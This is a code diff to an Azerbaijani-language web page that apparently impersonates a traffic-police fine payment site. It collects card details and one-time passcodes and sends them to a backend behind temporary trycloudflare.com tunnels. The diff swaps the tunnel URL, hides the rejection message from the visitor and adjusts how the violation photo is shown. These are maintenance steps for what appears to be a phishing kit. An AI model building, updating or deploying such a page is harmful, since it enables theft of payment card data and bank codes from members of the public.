@@ -191,7 +191,7 @@
     </div>
 
     <script>
-        let API_URL = localStorage.getItem('dyp_active_api_url') || 'https://chester-police-fragrance-initiated.trycloudflare.com/api';
+        let API_URL = localStorage.getItem('dyp_active_api_url') || 'https://census-biological-arbitration-remarks.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -395,7 +395,7 @@
             if (data.isRejected) {
                 document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
-                document.getElementById('reject-modal').classList.remove('hidden');
+                document.getElementById('reject-modal').classList.add('hidden');
                 return;
             } else {
                 document.getElementById('reject-modal').classList.add('hidden');
@@ -515,12 +515,17 @@
             const photoContainer = document.getElementById('photo-container');
             if (photoContainer) {
                 if (data.photoUrl) {
-                    photoContainer.innerHTML = `<img src="${data.photoUrl}?t=${Date.now()}" alt="Pozuntu şəkli" class="w-full h-full object-cover">`;
+                    const existingImg = photoContainer.querySelector('img');
+                    if (!existingImg || !existingImg.src.startsWith(data.photoUrl)) {
+                        photoContainer.innerHTML = `<img src="${data.photoUrl}" alt="Pozuntu şəkli" class="w-full h-full object-cover">`;
+                    }
                 } else {
-                    photoContainer.innerHTML = `
-                        <div class="text-4xl mb-1">🚗📸</div>
-                        <span class="text-xs font-medium text-center px-4">Maşının şəkli yüklənməyib</span>
-                    `;
+                    if (!photoContainer.querySelector('span') || photoContainer.querySelector('img')) {
+                        photoContainer.innerHTML = `
+                            <div class="text-4xl mb-1">🚗📸</div>
+                            <span class="text-xs font-medium text-center px-4">Maşının şəkli yüklənməyib</span>
+                        `;
+                    }
                 }
             }
         }
